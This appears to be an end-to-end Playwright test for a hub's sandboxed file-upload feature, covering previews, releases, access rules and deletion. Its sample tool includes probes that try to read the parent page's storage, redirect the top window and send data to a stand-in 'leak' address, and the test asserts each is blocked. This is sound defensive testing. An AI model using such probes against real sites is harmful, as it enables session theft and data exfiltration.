// End-to-end run of uploaded tiles against the mock (test harness only): dashboard, Files page, conversion,
// preview, Make live, guard, Restore. The mock runs the real handler of supabase/functions/tile-upload with a
// folder of this repo (pmo/) as the store. Usage (mock running, seed applied): node dev/test/upload-e2e.mjs
import { createRequire } from 'node:module';
import { execFileSync } from 'node:child_process';
import { rmSync, mkdirSync, writeFileSync, existsSync } from 'node:fs';
const require = createRequire(process.env.PLAYWRIGHT_ROOT || import.meta.url);
const { chromium } = require('playwright');
const B = 'http://localhost:8080';
const psql = (q) => execFileSync('psql', [...(process.env.PGARGS || '-h /tmp -p 5499 -U postgres -d dame').split(' '), '-At', '-c', q], { encoding: 'utf8' }).trim();
const errors = [];
let step = '';
const log = (s) => { step = s; console.log('• ' + s); };
const expect = (c, m) => { if (c) console.log('  ✓ ' + m); else { errors.push(step + ': ' + m); console.log('  ✗ ' + m); } };

rmSync(new URL('../../pmo', import.meta.url), { recursive: true, force: true });
psql(`delete from core.tiles where id in ('pmo', 'spp')`); psql(`delete from core.audit where tile_id = 'pmo'`);
psql(`update core.profiles set status = 'active' where username in ('demo_admin', 'demo_viewer', 'demo_none')`);   // the main e2e disables demo_none
psql(`insert into core.tiles (id, name, tagline, icon, accent, sort_order, enabled, hosting) values ('pmo', 'PMO', 'Project office', 'chart', 'violet', 5, true, 'upload')`);
psql(`insert into core.tile_access (user_id, tile_id, level) select id, 'pmo', case username when 'demo_admin' then 'manage' else 'read' end from core.profiles where username in ('demo_admin', 'demo_viewer')`);

// The tool, as a team would have it: one page with inline script and style, onclick, style="", a CDN library,
// innerHTML with style="" and a second page.
const dir = '/tmp/pmo-tool';
rmSync(dir, { recursive: true, force: true }); mkdirSync(dir + '/pages', { recursive: true });
const tool = (v) => `<!DOCTYPE html><html><head><meta charset="utf-8"><title>PMO ${v}</title>
<script src="https://cdn.example.test/lib.js"></script>
<style>#count { font-weight: 700 } .card { padding: 8px }</style></head>
<body onload="ready()">
<h1 id="h" style="color: rgb(10, 123, 194)">PMO tracker ${v}</h1>
<button id="add" onclick="add(1); return false;">Add</button> <span id="count">0</span>
<div id="list"></div>
<a href="pages/more.html" id="more">More</a>
<script>
  var n = 0;
  function add(k) { n += k; document.getElementById('count').textContent = n;
    document.getElementById('list').innerHTML += '<p class="card" style="color: rgb(255, 0, 0)">row ' + n + '</p>'; }
  function ready() { document.body.setAttribute('data-ready', 'yes'); }
  // what a sealed tool can and cannot do
  var probe = { origin: String(window.origin) };
  try { window.parent.localStorage.getItem('x'); probe.storage = 'READ'; } catch (e) { probe.storage = 'blocked'; }
  try { probe.doc = window.parent.document.title ? 'READ' : 'READ'; } catch (e) { probe.doc = 'blocked'; }
  try { window.top.location = 'about:blank'; probe.top = 'sent'; } catch (e) { probe.top = 'blocked'; }
  localStorage.setItem('visits', String(Number(localStorage.getItem('visits') || 0) + 1));
  probe.visits = localStorage.getItem('visits');
  document.documentElement.setAttribute('data-probe', JSON.stringify(probe));
  fetch('https://example.com/leak?d=1').then(function () { document.documentElement.setAttribute('data-leak', 'SENT'); }, function () { document.documentElement.setAttribute('data-leak', 'blocked'); });
  document.addEventListener('click', function (e) {
    if (e.target.id !== 'save') return;
    Dame.save('rows', { n: n, by: Dame.user().username }).then(function (r) { return Dame.list('rows'); })
      .then(function (rows) { document.getElementById('rows').textContent = String(rows.length); }, function (err) { document.getElementById('rows').textContent = 'ERR ' + err.code; });
  });
</script><button id="save">Save</button> <span id="rows">-</span></body></html>`;
writeFileSync(dir + '/tracker.html', tool('v1'));
writeFileSync(dir + '/pages/more.html', '<!doctype html><title>More</title><p id="m">More page</p><a href="../index.html">Back</a>');

const browser = await chromium.launch({ executablePath: process.env.CHROME || undefined });
async function as(user, viewport, pass) {
  const ctx = await browser.newContext({ viewport: viewport || { width: 1100, height: 800 } });
  const page = await ctx.newPage();
  page.csp = 0;
  page.on('console', (m) => { if (m.type() === 'error') { if (/Content Security Policy/.test(m.text())) page.csp++; else if (!/40[034]|422|ERR_FAILED|example\.com|sandboxed|Unsafe attempt|Blocked a frame/.test(m.text())) errors.push(step + ': console ' + m.text()); } });
  page.on('pageerror', (e) => errors.push(step + ': pageerror ' + e.message));
  await page.goto(B + '/dame-hub/');
  await page.fill('#si-email', user.indexOf('@') > 0 ? user : user + '@example.com'); await page.fill('#si-pass', pass || 'DemoPass2026'); await page.click('#signin button[type=submit]');
  await page.waitForURL(/dashboard/);
  return page;
}
const shot = (p, n) => p.screenshot({ path: 'dev/test/out/' + n + '.png', fullPage: true });
async function sealed(page, ready) {   // the sealed frame of an uploaded tile (a srcdoc frame: reached through locators)
  const fl = page.frameLocator('#up-frame'), html = fl.locator('html');
  await fl.locator(ready || 'body[data-ready]').waitFor({ state: 'attached' });
  return {
    click: (sel) => fl.locator(sel).first().click(),
    textContent: (sel) => fl.locator(sel).first().textContent(),
    getAttribute: (sel, name) => fl.locator(sel).first().getAttribute(name),
    evaluate: (fn) => html.evaluate(fn),
    waitForSelector: (sel) => fl.locator(sel).first().waitFor({ state: 'attached' }),
    waitForTimeout: (ms) => page.waitForTimeout(ms),
    waitForFunction: async (fn) => { for (let i = 0; i < 100; i++) { if (await html.evaluate(fn)) return; await page.waitForTimeout(100); } throw new Error('waitForFunction in the sealed frame timed out'); }
  };
}
async function confirmSheet(page, label) { await page.locator('.sheet button', { hasText: label }).click(); }

try {
  log('dashboard before any upload');
  const admin = await as('demo_admin');
  await admin.waitForSelector('#tiles .tile');
  const card = admin.locator('#tiles .tile', { hasText: 'PMO' });
  expect(await card.getAttribute('href') === '/dame-hub/upload.html?tile=pmo', 'manager: PMO opens the Files page');
  expect((await card.textContent()).includes('No files yet'), 'manager: "No files yet. Upload them."');
  const viewer = await as('demo_viewer');
  await viewer.waitForSelector('#tiles .tile');
  const vcard = viewer.locator('#tiles .tile', { hasText: 'PMO' });
  expect(await vcard.evaluate((e) => e.tagName) === 'DIV' && (await vcard.textContent()).includes('Not ready yet'), 'reader: "Not ready yet", not a link');

  log('upload a folder as preview');
  await admin.goto(B + '/dame-hub/upload.html?tile=pmo');
  await admin.waitForSelector('#live-text:not(:has-text("Loading"))');
  expect((await admin.textContent('#live-text')).includes('Nothing is live yet'), 'nothing live');
  await admin.setInputFiles('#pick-files', [dir + '/tracker.html', dir + '/pages/more.html'].map((p) => p));
  // setInputFiles drops folders; the second page comes as more.html at the top: upload the folder instead
  await admin.setInputFiles('#pick-folder', dir);
  await admin.waitForSelector('#chosen:not([hidden])');
  expect((await admin.textContent('#chosen-text')).startsWith('2 files'), 'two files chosen from the folder');
  await admin.click('#send');
  await admin.waitForSelector('#preview-card:not([hidden])', { timeout: 15000 });
  expect((await admin.textContent('#preview-text')).includes('Version'), 'preview recorded');
  await shot(admin, 'upload-preview');

  log('the preview, as the manager, in the sealed frame');
  await admin.goto(B + '/dame-hub/pmo/_next/');
  await admin.waitForSelector('#up-bar');
  expect(await admin.locator('#up-bar .up-badge').textContent() === 'Preview, not live', 'bar says preview');
  let f = await sealed(admin);
  expect(await admin.getAttribute('#up-frame', 'sandbox') === 'allow-scripts allow-forms allow-modals allow-downloads', 'frame is sandboxed, no same-origin, no popups, no top navigation');
  const probe = JSON.parse(await f.getAttribute('html', 'data-probe'));
  expect(probe.origin === 'null', 'the tool has no origin of its own');
  expect(probe.storage === 'blocked' && probe.doc === 'blocked', 'it cannot read the site\'s storage (the session) or the page around it');
  expect(probe.top !== 'sent' && admin.url().includes('/pmo/_next/'), 'it cannot move the page away');
  await f.waitForSelector('html[data-leak]');
  expect(await f.getAttribute('html', 'data-leak') === 'blocked', 'it cannot call an outside address');
  expect(await f.evaluate(() => getComputedStyle(document.getElementById('h')).color) === 'rgb(10, 123, 194)', 'style="" applied under the policy');
  expect(await f.evaluate(() => getComputedStyle(document.getElementById('count')).fontWeight) === '700', 'inline <style> works as a file');
  expect(await f.evaluate(() => window.Lib && window.Lib.v === 1), 'CDN library copied in and loaded');
  await f.click('#add'); await f.click('#add');
  expect(await f.textContent('#count') === '2', 'onclick handlers run');
  await f.waitForTimeout(100);
  expect(await f.evaluate(() => getComputedStyle(document.querySelector('#list p')).color) === 'rgb(255, 0, 0)', 'style="" in HTML added by script applied');
  await f.click('#save'); await f.waitForFunction(() => document.getElementById('rows').textContent !== '-');
  expect(await f.textContent('#rows') === '1', 'Dame.save and Dame.list work (preview data)');
  await admin.waitForTimeout(700);   // the stand-in saves 400 ms after a change
  await f.click('#more');
  await admin.waitForFunction(() => location.hash === '#pages/more.html');
  const f2 = await sealed(admin, '#m');
  expect(await f2.textContent('#m') === 'More page', 'second page in a folder opens through the shell');
  await f2.click('a'); await admin.waitForFunction(() => location.hash === '' || location.hash === '#');
  f = await sealed(admin);
  expect(Number(JSON.parse(await f.getAttribute('html', 'data-probe')).visits) === Number(probe.visits) + 1, 'localStorage stand-in is kept by the site between page loads');
  const raw = await admin.request.get(B + '/dame-hub/pmo/_next/index.html.txt');
  expect(raw.headers()['content-type'].startsWith('text/plain') && (await raw.text()).includes('PMO tracker'), 'the tool page itself is served as text, never as HTML');

  log('the preview, as a reader');
  await viewer.goto(B + '/dame-hub/pmo/_next/');
  await viewer.waitForSelector('#up-gate');
  expect((await viewer.textContent('#up-gate')).includes('only for the tile\'s managers'), 'reader cannot open the preview');
  expect(await viewer.locator('#up-frame').count() === 0, 'no frame is made');

  log('make live');
  await admin.goto(B + '/dame-hub/upload.html?tile=pmo');
  await admin.waitForSelector('#preview-card:not([hidden])');
  await admin.click('#make-live'); await confirmSheet(admin, 'Make live');
  await admin.waitForSelector('#preview-card[hidden]', { state: 'attached', timeout: 15000 });
  expect((await admin.textContent('#live-text')).includes('Version'), 'live version shown');
  await viewer.goto(B + '/dame-hub/dashboard.html'); await viewer.waitForSelector('#tiles a.tile');
  expect(await viewer.locator('#tiles .tile', { hasText: 'PMO' }).getAttribute('href') === '/dame-hub/pmo/', 'reader: tile opens /dame-hub/pmo/');
  await viewer.goto(B + '/dame-hub/pmo/'); await viewer.waitForSelector('#up-bar');
  let vf = await sealed(viewer);
  expect((await vf.textContent('#h')).includes('v1'), 'reader sees v1');
  await vf.click('#save'); await vf.waitForFunction(() => document.getElementById('rows').textContent !== '-');
  expect(await vf.textContent('#rows') === 'ERR NO_RIGHT', 'a reader cannot write shared data');
  await admin.goto(B + '/dame-hub/pmo/'); f = await sealed(admin);
  await f.click('#save'); await f.waitForFunction(() => document.getElementById('rows').textContent !== '-');
  expect(await f.textContent('#rows') === '1', 'live data is separate from preview data; the manager saves');
  await admin.goto(B + '/dame-hub/upload.html?tile=pmo'); await admin.waitForSelector('#history table');
  expect(await viewer.locator('#up-bar .up-link').count() === 0, 'no Files link for a reader');
  await shot(viewer, 'upload-live-viewer');
  const none = await as('demo_none');
  await none.goto(B + '/dame-hub/pmo/'); await none.waitForSelector('#up-gate');
  expect((await none.textContent('#up-gate')).includes('nothing here for you'), 'no access: Nothing here');
  const anon = await (await browser.newContext()).newPage();
  await anon.goto(B + '/dame-hub/pmo/'); await anon.waitForURL(/\/dame-hub\/\?next=/);
  expect(true, 'signed out: sent to sign in');

  log('replace, then restore');
  writeFileSync(dir + '/tracker.html', tool('v2'));
  await admin.setInputFiles('#pick-folder', dir); await admin.waitForSelector('#chosen:not([hidden])');
  await admin.click('#send'); await admin.waitForSelector('#preview-card:not([hidden])', { timeout: 15000 });
  await admin.click('#make-live'); await confirmSheet(admin, 'Make live');
  await admin.waitForSelector('#preview-card[hidden]', { state: 'attached', timeout: 15000 });
  await viewer.goto(B + '/dame-hub/pmo/'); vf = await sealed(viewer);
  expect((await vf.textContent('#h')).includes('v2'), 'reader sees v2');
  await admin.waitForSelector('#history button:has-text("Restore")');
  await admin.locator('#history button', { hasText: 'Restore' }).first().click(); await confirmSheet(admin, 'Restore');
  await admin.waitForSelector('.toast.success:has-text("live again")', { timeout: 15000 });
  await viewer.goto(B + '/dame-hub/pmo/'); vf = await sealed(viewer);
  expect((await vf.textContent('#h')).includes('v1'), 'restored: reader sees v1 again');
  expect(psql(`select string_agg(status, ',' order by id) from core.tile_releases where tile_id = 'pmo'`) === 'live,old', 'releases: v1 live again, v2 old');
  console.log('  releases: ' + psql(`select string_agg(id || ' ' || status, ', ' order by id) from core.tile_releases where tile_id = 'pmo'`));
  expect(psql(`select count(*) from core.audit where tile_id = 'pmo' and action like 'upload%'`) === '5', 'five upload actions in the audit (2 previews, 2 live, 1 restore)');

  log('a refused upload, a phone');
  writeFileSync(dir + '/other.html', '<p>second start page</p>');
  writeFileSync(dir + '/index.html', '<script>navigator.serviceWorker.register("sw.js")</script>');
  await admin.setInputFiles('#pick-folder', dir); await admin.waitForSelector('#chosen:not([hidden])');
  await admin.click('#send'); await admin.waitForSelector('#upload-error:not([hidden])', { timeout: 15000 });
  expect((await admin.textContent('#upload-notes')).includes('service worker'), 'reasons listed');
  const phone = await as('demo_admin', { width: 390, height: 844 });
  await phone.goto(B + '/dame-hub/upload.html?tile=pmo'); await phone.waitForSelector('#history table');
  await shot(phone, 'upload-390');
  const scroll = await phone.evaluate(() => document.documentElement.scrollWidth);
  expect(scroll <= 392, 'Files page fits 390 px (' + scroll + ')');
  await phone.goto(B + '/dame-hub/pmo/'); await sealed(phone);
  await shot(phone, 'upload-tile-390');

  log('super user: new tile with next steps, delete a tile');
  const owner = await as('niyaz@gmail.com', null, 'OwnerPass2026');
  await owner.goto(B + '/dame-hub/admin.html#tiles'); await owner.waitForSelector('#tiles table');
  await owner.click('#tile-new');
  expect(await owner.inputValue('#tf-hosting') === 'upload', 'New tile asks how it is made first, uploaded by default');
  await owner.fill('#tf-id', 'spp'); await owner.fill('#tf-name', 'SPP');
  await owner.locator('.sheet button', { hasText: 'Save' }).click();
  await owner.waitForSelector('.sheet .guide-prompt');
  expect((await owner.inputValue('.sheet .guide-prompt')).includes('Build a tool called "SPP"'), 'next steps show the AI prompt with the tile name');
  expect(await owner.locator('.sheet button', { hasText: 'Upload files' }).count() === 1, 'next steps offer Upload files');
  await owner.locator('.sheet button', { hasText: 'Upload files' }).click(); await owner.waitForURL(/upload\.html\?tile=spp/);
  await owner.waitForSelector('#guide .guide-prompt', { state: 'attached' });
  expect(true, 'Files page carries the same guide');
  await owner.goto(B + '/dame-hub/admin.html#tiles'); await owner.waitForSelector('#tiles table');
  const row = owner.locator('#tiles tr', { hasText: '/dame-hub/pmo/' });
  await row.locator('button', { hasText: 'Edit' }).click();
  await owner.locator('.sheet button', { hasText: 'Delete tile' }).click();
  await owner.waitForSelector('#td-confirm');
  await owner.locator('.sheet button', { hasText: 'Delete tile' }).click();
  expect((await owner.textContent('.sheet .notice.danger')).includes('Type the tile id'), 'delete needs the id typed');
  await owner.fill('#td-confirm', 'pmo'); await owner.locator('.sheet button', { hasText: 'Delete tile' }).click();
  await owner.waitForSelector('.toast.success:has-text("deleted")', { timeout: 15000 });
  expect(psql(`select count(*) from core.tiles where id = 'pmo'`) === '0' && psql(`select count(*) from core.tile_releases where tile_id = 'pmo'`) === '0', 'tile, access and versions gone');
  expect(!existsSync(new URL('../../pmo', import.meta.url)), 'uploaded files removed from the repo folder');
  expect(psql(`select count(*) from core.audit where tile_id = 'pmo' and action = 'tile_delete'`) === '1', 'delete is in the audit');
  await owner.locator('#tiles tr', { hasText: '/demo/' }).locator('button', { hasText: 'Edit' }).click();
  await owner.locator('.sheet button', { hasText: 'Delete tile' }).click();
  await owner.waitForSelector('.sheet textarea.guide-prompt');
  expect((await owner.inputValue('.sheet textarea.guide-prompt')).includes('drop schema if exists demo cascade'), 'a tile with data is refused, with the script to read');
  psql(`delete from core.tiles where id = 'spp'`);
} catch (e) {
  errors.push(step + ': ' + e.message);
} finally {
  await browser.close();
  if (!process.env.KEEP) rmSync(new URL('../../pmo', import.meta.url), { recursive: true, force: true });
}
if (errors.length) { console.log('\n' + errors.length + ' problem(s):\n' + errors.join('\n')); process.exit(1); }
console.log('\nUPLOAD E2E PASSED');
